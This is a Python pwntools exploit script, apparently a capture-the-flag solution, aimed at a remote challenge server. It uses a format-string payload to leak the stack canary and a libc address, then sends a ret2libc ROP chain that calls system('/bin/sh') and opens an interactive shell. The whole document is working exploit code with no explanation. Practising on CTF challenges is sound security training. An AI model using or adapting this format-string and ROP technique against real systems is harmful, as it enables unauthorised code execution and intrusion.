from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.anna.nssctf.cn",28310)
# io=process("./pwn")
libc=ELF("./libc.so.6")

# gdb.attach(io)
# pause()

pop_rdi=0x4013f3
ret=0x40101a

io.recvuntil(b"Toka\n\n")
# payload="%15$p.%17$p.%486c%9$n"  #520-18-14-2   
payload="%520c%9$n.%15$p.%17$p"
io.send(payload)

# gdb.attach(io)
# pause()

io.recvuntil(b".")
canary=int(io.recv(18),16)
io.recvuntil(b".")
leak_addr=int(io.recv(14),16)-libc.sym[b"__libc_start_main"]-243
sys_addr=leak_addr+libc.sym[b"system"]
sh_addr=leak_addr+next(libc.search(b"/bin/sh"))

print("canary: ",hex(canary))
print("leak_addr: ",hex(leak_addr))

payload=cyclic(0x28)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)
io.sendlineafter(b"vel\n\n",payload)


io.interactive()